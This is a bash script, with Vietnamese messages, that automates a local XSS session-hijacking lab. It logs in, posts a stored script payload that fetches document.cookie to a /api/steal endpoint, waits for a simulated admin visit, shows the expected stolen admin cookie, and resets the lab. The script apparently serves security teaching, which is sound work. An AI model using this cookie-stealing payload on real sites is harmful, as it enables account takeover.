#!/bin/bash

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║         🧪 AUTO-TEST XSS SESSION HIJACKING                  ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""

echo "📝 Step 1: Login as user1"
echo "───────────────────────────────────────────────────────────────"
LOGIN=$(curl -s -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"user1","password":"password1"}')
echo $LOGIN | jq
echo ""

echo "📝 Step 2: Post XSS payload"
echo "───────────────────────────────────────────────────────────────"
PAYLOAD='<script>fetch("/api/steal?cookie="+document.cookie)</script>'
echo "Payload: $PAYLOAD"
COMMENT=$(curl -s -X POST http://localhost:3000/api/comment \
  -H "Content-Type: application/json" \
  -H "Cookie: auth=user1:password1" \
  -d "{\"comment\":\"$PAYLOAD\"}")
echo $COMMENT | jq
echo ""

echo "⏰ Step 3: Auto-Test Triggered!"
echo "───────────────────────────────────────────────────────────────"
echo "Server sẽ tự động giả lập admin xem comment sau 5 giây..."
echo "Đang đợi..."

for i in {5..1}; do
    echo -n "$i... "
    sleep 1
done
echo ""
echo ""

echo "✅ Step 4: Check Results"
echo "───────────────────────────────────────────────────────────────"
echo "Xem server console để thấy:"
echo "  1. ⏰ [AUTO-TEST] Admin sẽ xem comment sau 5 giây..."
echo "  2. 👤 [AUTO-TEST] Admin đang xem comment..."
echo "  3. ✅ [AUTO-TEST] Admin đã xem trang (status: 200)"
echo "  4. 🚨 [AUTO-TEST] XSS payload detected! Simulating JavaScript execution..."
echo "  5. 🚨 STOLEN COOKIE RECEIVED: auth=admin:admin123"
echo "  6. ✅ [AUTO-TEST] XSS simulation completed"
echo ""

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║              ✨ AUTO-TEST COMPLETED! ✨                     ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""

echo "🔄 Step 5: Auto-Reset Comments"
echo "───────────────────────────────────────────────────────────────"
echo "Truy cập trang chính để reset XSS comments..."
curl -s http://localhost:3000/ > /dev/null
echo "✅ Auto-reset triggered!"
echo ""
echo "Server console sẽ hiển thị:"
echo "  🔄 [AUTO-RESET] Đang kiểm tra và reset comments..."
echo "  🧹 [AUTO-RESET] Tìm thấy X XSS comments, đang xóa..."
echo "  ✅ [AUTO-RESET] Đã xóa tất cả comments"
echo "  ✅ [AUTO-RESET] Đã khôi phục comments mặc định"
echo ""

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║          ✨ LAB RESET - READY FOR NEXT TEST! ✨            ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""
echo "💡 Tip: Xem thêm chi tiết trong file AUTO-TEST.md"

